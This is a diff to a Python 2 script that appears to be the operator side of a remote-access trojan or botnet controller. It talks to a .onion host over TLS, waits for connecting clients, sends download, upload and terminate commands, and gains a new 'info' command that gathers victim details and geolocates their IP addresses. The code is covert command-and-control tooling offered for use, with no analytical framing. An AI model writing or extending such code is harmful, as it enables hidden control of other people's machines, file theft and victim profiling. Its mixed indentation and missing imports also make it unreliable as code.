@@ -1,9 +1,11 @@
-import socket, ssl, os, sys, time, hashlib, hmac
+import socket, ssl, os, sys, time, hashlib, hmac, geoip2.database
 from colored import fg, bg, attr
 from subprocess import check_output
+from clint.textui import colored
 
 host = '3pnzzdpq7aj6s6b6.onion'
 hasher = hashlib.sha256()
+reader = geoip2.database.Reader('GeoLite2-City.mmdb')
 
 pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid
 
@@ -24,6 +26,12 @@ except socket.error, (value,message):
 def RecvData():
     temp = connstream.read()
     return temp
+
+def DigGeoIp(ip):
+    response = reader.city(ip)
+    country = response.country.name
+    city = response.city.name
+    print "|--- " + ip + " " + city + " " + country
 
 def CheckHash(fileName,fileHashHEX):
     with open(fileName, 'rb') as inFile:
@@ -103,7 +111,7 @@ while True:
         cType = RecvData()
         print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
         while True:
-            inText = raw_input('[input] ')
+            inText = raw_input(colored.blue('<T2B')+':'+colored.yellow(''+cType+'> '))
             if inText.startswith("download"):
                 SendData(inText)
                 DownloadFILE(inText.split(" ")[1])
@@ -111,6 +119,19 @@ while True:
                 SendData(inText)
                 UploadFILE(inText.split(" ")[1])
                 chunk = RecvData()
+            elif inText == "info":
+                SendData("info")
+                infos = RecvData()
+                print "---" + cType + "---"
+                while infos != "end-info":
+                    if infos.startswith('ip'):
+			if infos.split(':')[1].startswith('Error'):
+			    print "|--- " + infos
+			else:
+                            DigGeoIp(infos.split(':')[1])
+                    else:
+                        print "|--- " + infos
+                    infos = RecvData()
             elif inText == "terminate":
                 SendData("terminate")
                 print ("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0))
